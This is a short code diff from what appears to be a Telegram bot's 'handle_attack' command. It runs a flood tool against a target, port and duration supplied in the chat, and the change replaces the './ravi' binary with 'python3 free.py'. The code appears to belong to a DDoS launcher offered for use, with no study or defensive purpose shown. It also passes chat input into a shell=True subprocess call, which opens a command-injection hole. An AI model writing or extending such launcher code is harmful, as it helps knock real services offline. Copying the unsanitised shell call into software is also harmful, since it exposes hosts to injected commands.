@@ -419,7 +419,7 @@ def handle_attack(message):
     # ✅ Attack Execution Function
     def attack_execution():
         try:
-            subprocess.run(f"./ravi {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
+            subprocess.run(f"python3 free.py {target} {port} {time_duration} 1200", shell=True, check=True, timeout=time_duration)
         except subprocess.CalledProcessError:
             bot.reply_to(message, "❌ **ATTACK FAIL HO GAYA!**")
         finally:
